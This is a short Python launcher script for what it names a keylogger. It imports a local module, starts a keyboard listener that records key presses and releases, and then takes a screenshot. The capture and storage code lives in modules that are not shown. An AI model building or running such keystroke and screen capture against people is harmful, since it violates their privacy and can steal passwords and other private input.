# libreries #
from keylogger_module import keyboard, on_press, on_release
from keylogger_module.screenshot import screenshot


listener = keyboard.Listener(on_press = on_press, on_release = on_release)
with listener :
    listener.join()


screenshot()